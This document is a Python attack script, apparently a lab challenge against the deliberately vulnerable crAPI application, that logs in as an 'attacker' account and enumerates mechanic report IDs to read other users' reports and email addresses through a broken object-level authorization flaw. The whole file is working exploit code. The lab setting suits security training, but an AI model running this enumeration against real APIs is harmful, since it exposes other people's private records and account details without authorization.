#!/usr/bin/env python3
"""Challenge 2: Access mechanic reports of other users (BOLA)"""
import argparse, sys, time
from pathlib import Path
from typing import Optional, Dict, Any
import requests, yaml

def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)

def login(base_url: str, email: str, password: str, timeout: float = 15) -> Optional[str]:
    try:
        r = requests.post(f"{base_url.rstrip('/')}/identity/api/auth/login",
                         json={"email": email, "password": password}, timeout=timeout)
        return r.json().get("token") or r.json().get("access_token")
    except:
        return None

def get_vehicles(base_url: str, token: str, timeout: float = 15) -> list:
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(f"{base_url.rstrip('/')}/identity/api/v2/vehicle/vehicles", headers=headers, timeout=timeout).json()
        return r if isinstance(r, list) else r.get("vehicles") or []
    except:
        return []

def contact_mechanic(base_url: str, token: str, vin: str, timeout: float = 15) -> Optional[Dict[str, Any]]:
    headers = {"Authorization": f"Bearer {token}"}
    payload = {
        "mechanic_api": f"{base_url.rstrip('/')}/workshop/api/mechanic/receive_report",
        "mechanic_code": "TRAC_JHN",
        "number_of_repeats": 1,
        "problem_details": "BOLA test",
        "repeat_request_if_failed": False,
        "vin": vin
    }
    try:
        return requests.post(f"{base_url.rstrip('/')}/workshop/api/merchant/contact_mechanic",
                            json=payload, headers=headers, timeout=timeout).json()
    except:
        return None

def get_mechanic_report(base_url: str, token: str, report_id: int, timeout: float = 15) -> Optional[Dict[str, Any]]:
    headers = {"Authorization": f"Bearer {token}"}
    try:
        return requests.get(f"{base_url.rstrip('/')}/workshop/api/mechanic/mechanic_report",
                           headers=headers, params={"report_id": report_id}, timeout=timeout).json()
    except:
        return None

def extract_report_id(response: Dict[str, Any]) -> Optional[int]:
    if not response:
        return None
    rfm = response.get("response_from_mechanic_api") or {}
    return int(rfm.get("id")) if rfm.get("id") else None

def main():
    parser = argparse.ArgumentParser(description="Challenge 2: BOLA on Mechanic Reports")
    parser.add_argument("--config", default="../crapi_config.yaml")
    parser.add_argument("--attacker-email", default="mike1@my.lab")
    parser.add_argument("--start-id", type=int, default=1)
    parser.add_argument("--count", type=int, default=20)
    args = parser.parse_args()

    cfg = load_config(Path(args.config))
    base_url = cfg["target"]["base_url"]
    password = cfg["known_users"]["password"]

    print(f"[*] Challenge 2: BOLA on Mechanic Reports\n[*] Target: {base_url}\n" + "-"*60)

    token = login(base_url, args.attacker_email, password)
    if not token:
        print("[!] Login failed"); sys.exit(1)
    print("[+] Logged in")

    vehicles = get_vehicles(base_url, token)
    if not vehicles:
        print("[!] No vehicles found"); sys.exit(1)

    vin = vehicles[0].get("vin")
    contact_resp = contact_mechanic(base_url, token, vin)
    own_report_id = extract_report_id(contact_resp)
    if own_report_id:
        print(f"[+] Created own report: ID={own_report_id}")
    time.sleep(1)

    print(f"\n[!] BOLA ATTACK: Enumerating report IDs ({args.start_id}-{args.start_id + args.count})...")
    print("-"*60)

    found_reports = []
    for report_id in range(args.start_id, args.start_id + args.count):
        report = get_mechanic_report(base_url, token, report_id)
        if report and "status" in report:
            user = report.get("user_email") or "unknown"
            found_reports.append((report_id, user))
            print(f"[+] Report {report_id}: {user}")
        time.sleep(0.2)

    if found_reports:
        print(f"\n[+] SUCCESS! Found {len(found_reports)} accessible reports via BOLA")
        print(f"[!] VULNERABLE: Can enumerate and access other users' mechanic reports")
    else:
        print("[!] Could not find other users' reports")

if __name__ == "__main__":
    main()
